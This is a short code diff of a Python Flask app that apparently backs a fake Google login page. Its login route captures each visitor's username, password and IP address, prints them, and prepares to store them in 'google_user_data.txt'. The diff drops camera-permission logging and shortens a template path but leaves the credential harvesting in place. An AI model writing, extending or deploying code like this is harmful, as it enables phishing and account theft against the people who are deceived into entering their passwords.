@@ -33,12 +33,10 @@ def login():
     username = request.form['username']
     password = request.form['password']
     user_ip = request.remote_addr
-    camera_permission = request.form.get('camera_permission', False)
     
     print('User: ', username)
     print('Password: ', password)
     print(f"User IP address: {user_ip}")
-    print('Camera permission granted:', camera_permission)
 
     current_path = os.path.abspath(os.path.dirname(__file__))
     file_path = os.path.join(current_path, 'google_user_data.txt')
@@ -58,7 +56,7 @@ def login():
 
 @app.route("/info")
 def infa():
-    return render_template('blok(Google)/Blok.html')
+    return render_template('Blok.html')
 
 def run_flask():
     app.run(host='0.0.0.0', port=port, debug=True, use_reloader=False)
